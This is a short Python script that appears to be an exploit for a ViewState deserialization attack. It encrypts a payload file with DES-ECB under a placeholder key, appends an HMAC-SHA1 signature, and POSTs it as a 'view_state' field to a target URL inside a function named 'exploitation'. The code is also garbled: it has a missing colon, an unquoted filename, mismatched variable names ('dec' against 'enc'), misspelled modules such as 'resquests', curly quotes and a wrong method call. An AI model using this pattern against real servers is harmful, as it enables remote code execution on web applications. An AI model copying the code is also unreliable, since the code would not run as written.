from base64 import b64decode,b64encode
from hashlib import sha1
import hmac,sha1

def create_payload()
   payload=open(payload.bin,”rb”)
  return encrypt_payload(payload)


def encrypt_payload(payload):
   key=b64decode(“<encryptioon_key>”)
   obj=pyDes.dec(key,pyDes.ECB,padmode=pyDes.PAD_PKCS5)
   dec=obj.encrypt(payload)
   hash_value=(hmac.new(key,bytes(enc),sha1).digest())
   payload=enc+hash_value
   return payload

def exploitation():
  malicous_view_state=create_payload()
  data={“view_state”:malicious_view_state}
  resquests.post(url,data=data)


exploitation()
